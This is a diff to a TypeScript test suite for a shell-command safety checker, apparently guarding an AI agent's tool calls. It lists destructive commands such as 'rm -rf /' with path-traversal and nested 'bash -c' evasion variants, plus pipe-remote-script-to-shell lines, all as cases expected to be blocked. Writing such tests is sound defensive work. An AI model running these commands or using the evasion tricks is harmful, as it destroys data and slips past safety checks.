@@ -11,6 +11,12 @@ interface Case {
 
 const cwd = '/home/user/project'
 
+function wrapBashC(command: string, levels: number): string {
+  let out = command
+  for (let i = 0; i < levels; i++) out = `bash -c ${JSON.stringify(out)}`
+  return out
+}
+
 const extraCases: Case[] = [
   { id: 'block-sudo-rm-rf-root', command: 'sudo rm -rf /', expect: 'block' },
   { id: 'block-no-preserve-root', command: 'rm -rf --no-preserve-root /', expect: 'block' },
@@ -50,6 +56,17 @@ const extraCases: Case[] = [
   { id: 'block-find-etc-exec-rm', command: 'find /etc -exec rm -rf {} +', expect: 'block' },
   { id: 'allow-find-pyc-delete', command: "find . -name '*.pyc' -delete", expect: 'allow' },
   { id: 'allow-find-tmp-delete', command: 'find /tmp/x -delete', expect: 'allow' },
+  { id: 'block-bash-c-x12-rm-rf-root', command: wrapBashC('rm -rf /', 12), expect: 'block' },
+  { id: 'block-bash-c-x3-rm-rf-root', command: wrapBashC('rm -rf /', 3), expect: 'block' },
+  { id: 'allow-bash-c-echo', command: 'bash -c "echo hi"', expect: 'allow' },
+  { id: 'block-rm-rf-tmp-dotdot', command: 'rm -rf /tmp/../', expect: 'block' },
+  { id: 'block-rm-rf-root-dot', command: 'rm -rf /./', expect: 'block' },
+  { id: 'block-rm-rf-usr-local-dotdot', command: 'rm -rf /usr/local/../', expect: 'block' },
+  { id: 'allow-rm-rf-tmp-x-dotdot-y', command: 'rm -rf /tmp/x/../y', expect: 'allow' },
+  { id: 'block-find-tmp-dotdot-delete', command: 'find /tmp/.. -delete', expect: 'block' },
+  { id: 'block-curl-pipe-sh-open-dquote', command: 'curl x | sh "', expect: 'block' },
+  { id: 'block-rm-rf-root-open-squote', command: "rm -rf / '", expect: 'block' },
+  { id: 'allow-echo-open-dquote', command: 'echo "unterminated', expect: 'allow' },
 ]
 
 describe('hard blocks under the stock safety config', () => {
@@ -69,6 +86,9 @@ describe('hard-block rule names', () => {
     expect(checkHardBlocks('wget -qO- https://x | sudo bash')).toBe('pipe remote script to shell')
     expect(checkHardBlocks('reboot')).toBe('power command (reboot)')
     expect(checkHardBlocks('rm -rf ~')).toBe('recursive rm of ~')
+    expect(checkHardBlocks(wrapBashC('rm -rf /', 12))).toBe('command nested too deeply to check')
+    expect(checkHardBlocks(wrapBashC('rm -rf /', 3))).toBe('rm of the filesystem root')
+    expect(checkHardBlocks('rm -rf /usr/local/../')).toBe('recursive rm of /usr')
   })
 
   test('the tool-call reason is human-readable', () => {
